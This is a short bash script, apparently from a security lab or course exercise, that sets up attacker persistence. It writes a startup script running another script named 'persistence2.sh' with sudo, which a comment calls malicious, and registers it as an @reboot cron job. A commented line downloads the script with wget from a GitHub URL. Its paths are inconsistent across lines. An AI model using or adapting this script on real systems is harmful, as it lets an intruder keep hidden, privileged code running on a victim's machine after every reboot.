#!/bin/bash

# wget https://raw.githubusercontent.com/S692/ossas/main/persistence1.sh
# chmod +x persistence1.sh

# create shell script that runs a malicious script at start up
echo "sudo /home/resch/persistence2.sh" > startup_scripts.sh
chmod +x /home/vagrant/startup_scripts.sh
# adding startup script to cron
(crontab -l ; echo "@reboot ~/startup_scripts.sh")| crontab -